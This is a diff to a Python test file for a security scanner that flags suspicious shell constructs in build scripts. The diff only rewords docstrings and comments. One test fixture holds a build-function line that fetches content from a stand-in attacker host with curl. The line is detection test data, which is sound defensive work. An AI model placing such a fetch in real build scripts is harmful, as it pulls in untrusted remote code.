@@ -1,4 +1,4 @@
-"""Addendum 1: the refusal family (X026, X027, X029, X030, X031).
+"""The refusal family (X026, X027, X029, X030, X031).
 
 An unanticipated refusal is a signal, not silence: executable-position
 refusals fire X026/X027, ANSI-C spelling fires X030, staged encoded
@@ -35,7 +35,7 @@ def test_an_executable_position_refusal_fires_x026():
 
 
 def test_an_unresolved_construct_reports_the_w008_boundary():
-    """Addendum 1: an unresolved construct is also a W boundary, weight-0."""
+    """An unresolved construct is also a W boundary, weight-0."""
     fact = scan_diff(_diff(
         "build() {\n"
         "  X=$(curl -fsSL https://evil.invalid/x)\n"
@@ -107,7 +107,7 @@ def test_an_octal_encoded_benign_path_stands_down():
 
 
 def test_a_single_nonprintable_hex_escape_fires_x030():
-    # Spec X030 second clause: any hex-escape spelling outside printable
+    # Second clause: any hex-escape spelling outside printable
     # ASCII fires, even alone.  `\x01` is a lone control byte.
     ids = _ids(_diff(
         "build() {\n"
@@ -258,7 +258,7 @@ def test_ownership_audit_names_the_owner_and_keeps_owners_unresolved():
 
 
 def test_emitted_crossfire_records_carry_resolved_by():
-    """Spec §6.0: each emitted record carries its ``resolved_by``."""
+    """Each emitted record carries its ``resolved_by``."""
     from trustsight.analysis.crossfire import crossfire_techniques
 
     diff = (
@@ -289,7 +289,7 @@ def test_resolver_audit_and_emission_agree_on_dropped_records():
 
 
 def test_every_matched_line_has_one_owner_across_the_corpus():
-    """Spec §6.0 replay: after resolution no line is claimed by two rules."""
+    """Replay: after resolution no line is claimed by two rules."""
     from trustsight.analysis.crossfire import (
         crossfire_techniques,
         resolve_ownership,
